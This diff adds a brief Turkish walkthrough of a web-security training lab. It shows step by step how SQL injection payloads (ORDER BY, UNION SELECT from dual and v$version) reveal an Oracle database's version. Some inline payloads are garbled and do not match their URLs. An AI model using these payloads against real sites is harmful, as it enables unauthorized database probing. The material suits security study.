@@ -1,0 +1,15 @@
+LAB: SQL injection attack, querying the database type and version on Oracle
+
+1 - Herhangi bir kategoriyi seçiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Gifts
+
+2 - ' ORDER BY 1-- payloadi ile sütun sayısını buluyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Gifts%27%20ORDER%20BY%202--
+
+3 - '+UNION+SELECT+'abc','def'+dual-- payloadı ile dual tablosundaki 2 sütununda string türünde oldugunu anlıyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+%27abc%27,%27def%27+FROM+dual--
+
+4 - 'UNION+SELECT,+NULL+FROM+v$version-- payloadı ile veritabanının sürümünü öğreniyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+
